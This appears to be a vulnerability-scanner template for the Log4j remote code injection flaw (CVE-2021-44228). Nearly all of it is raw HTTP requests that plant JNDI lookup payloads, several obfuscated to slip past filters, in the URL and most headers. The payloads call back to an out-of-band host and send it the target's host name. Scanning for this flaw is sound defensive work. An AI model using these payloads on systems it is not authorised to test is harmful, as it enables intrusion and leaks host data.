id: CVE-2021-44228-CUSTOM-AGGRESSIVE

info:
  name: Remote code injection in Log4j
  author: melbadry9,dhiyaneshDK,daffainfo,anon-artist,0xceba,Tea
  severity: critical
  description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
  reference:
    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
    - https://www.lunasec.io/docs/blog/log4j-zero-day/
    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
  tags: cve,cve2021,rce,oast,log4j
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.00
    cve-id: CVE-2021-44228
    cwe-id: CWE-502

requests:
  - raw:
      - |
        GET /?x=${jndi:ldap://${hostName}.{{interactsh-url}}/a} HTTP/1.1
        Host: {{Hostname}}
        Accept: ${jndi:ldap://${hostName}.accept.{{interactsh-url}}}
        Accept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}
        Accept-Language: ${jndi:ldap://${hostName}.acceptlanguage.{{interactsh-url}}}
        Access-Control-Request-Headers: ${jndi:ldap://${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}
        Access-Control-Request-Method: ${jndi:ldap://${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}
        Authentication: Basic ${jndi:ldap://${hostName}.authenticationbasic.{{interactsh-url}}}
        Authentication: Bearer ${jndi:ldap://${hostName}.authenticationbearer.{{interactsh-url}}}
        Cookie: ${jndi:ldap://${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}
        Location: ${jndi:ldap://${hostName}.location.{{interactsh-url}}}
        Origin: ${jndi:ldap://${hostName}.origin.{{interactsh-url}}}
        Referer: ${jndi:ldap://${hostName}.referer.{{interactsh-url}}}
        Upgrade-Insecure-Requests: ${jndi:ldap://${hostName}.upgradeinsecurerequests.{{interactsh-url}}}
        User-Agent: ${jndi:ldap://${hostName}.useragent.{{interactsh-url}}}
        X-Api-Version: ${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}
        X-CSRF-Token: ${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}
        X-Druid-Comment: ${jndi:ldap://${hostName}.xdruidcomment.{{interactsh-url}}}
        X-Forwarded-For: ${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}
        X-Origin: ${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}

  - raw:
      - |
        GET /?x=${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a} HTTP/1.1
        Host: {{Hostname}}
        Accept: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Accept-Encoding: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Accept-Language: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Access-Control-Request-Headers: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Access-Control-Request-Method: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Authentication: Basic ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Authentication: Bearer ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Cookie: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Location: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Origin: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Referer: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Upgrade-Insecure-Requests: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        User-Agent: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        X-Api-Version: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        X-CSRF-Token: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        X-Druid-Comment: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        X-Forwarded-For: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        X-Origin: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}

        x=${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}

  - raw:
      - |
        GET /?x=${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a} HTTP/1.1
        Host: {{Hostname}}
        Accept: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Accept-Encoding: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Accept-Language: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Access-Control-Request-Headers: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Access-Control-Request-Method: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Authentication: Basic ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Authentication: Bearer ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Cookie: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Location: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Origin: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Referer: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        Upgrade-Insecure-Requests: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        User-Agent: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        X-Api-Version: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        X-CSRF-Token: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        X-Druid-Comment: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        X-Forwarded-For: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}
        X-Origin: ${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}

        x=${jndi${123%25ff:-}:ldap://${hostName}.{{interactsh-url}}/a}

  - raw:
      - |
        GET /?x=${jndi:rmi://${hostName}.{{interactsh-url}}} HTTP/1.1
        Host: {{Hostname}}
        Accept: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        Accept-Encoding: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        Accept-Language: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        Access-Control-Request-Headers: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        Access-Control-Request-Method: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        Authentication: Basic ${jndi:rmi://${hostName}.{{interactsh-url}}}
        Authentication: Bearer ${jndi:rmi://${hostName}.{{interactsh-url}}}
        Cookie: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        Location: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        Origin: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        Referer: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        Upgrade-Insecure-Requests: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        User-Agent: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        X-Api-Version: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        X-CSRF-Token: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        X-Druid-Comment: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        X-Forwarded-For: ${jndi:rmi://${hostName}.{{interactsh-url}}}
        X-Origin: ${jndi:rmi://${hostName}.{{interactsh-url}}}

        x=${jndi:rmi://${hostName}.{{interactsh-url}}}

  - raw:
      - |
        GET /?x=${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z} HTTP/1.1
        Host: {{Hostname}}
        Accept: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        Accept-Encoding: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        Accept-Language: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        Access-Control-Request-Headers: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        Access-Control-Request-Method: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        Authentication: Basic ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        Authentication: Bearer ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        Cookie: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        Location: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        Origin: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        Referer: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        Upgrade-Insecure-Requests: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        User-Agent: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        X-Api-Version: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        X-CSRF-Token: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        X-Druid-Comment: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        X-Forwarded-For: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}
        X-Origin: ${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}

        x=${\u006a\u006e\u0064\u0069:ldap://{{interactsh-url}}/z}

  - raw:
      - |
        GET /?x=${jndi:ldap://127.0.0.1#{{interactsh-url}}/z} HTTP/1.1
        Host: {{Hostname}}
        Accept: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        Accept-Encoding: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        Accept-Language: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        Access-Control-Request-Headers: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        Access-Control-Request-Method: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        Authentication: Basic ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        Authentication: Bearer ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        Cookie: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        Location: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        Origin: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        Referer: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        Upgrade-Insecure-Requests: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        User-Agent: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        X-Api-Version: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        X-CSRF-Token: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        X-Druid-Comment: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        X-Forwarded-For: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}
        X-Origin: ${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}

        x=${jndi:ldap://127.0.0.1#{{interactsh-url}}/z}

  - raw:
      - |
        GET /${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z} HTTP/1.1
        Host: {{Hostname}}
        Accept: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        Accept-Encoding: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        Accept-Language: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        Access-Control-Request-Headers: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        Access-Control-Request-Method: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        Authentication: Basic ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        Authentication: Bearer ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        Cookie: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        Location: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        Origin: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        Referer: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        Upgrade-Insecure-Requests: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        X-CSRF-Token: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        X-Druid-Comment: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        X-Forwarded-For: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}
        X-Origin: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}

        x=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}/z}

  - raw:
      - |
        GET /${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}} HTTP/1.1
        Host: {{Hostname}}
        Accept: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        Accept-Encoding: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        Accept-Language: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        Access-Control-Request-Headers: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        Access-Control-Request-Method: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        Authentication: Basic ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        Authentication: Bearer ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        Cookie: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        Location: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        Origin: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        Referer: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        Upgrade-Insecure-Requests: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        User-Agent: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        X-Api-Version: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        X-CSRF-Token: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        X-Druid-Comment: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        X-Forwarded-For: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        X-Origin: ${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}

        x=${jndi${haha:-:}ldap:${::-/}/anything.{{interactsh-url}}/a}}
        

    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"
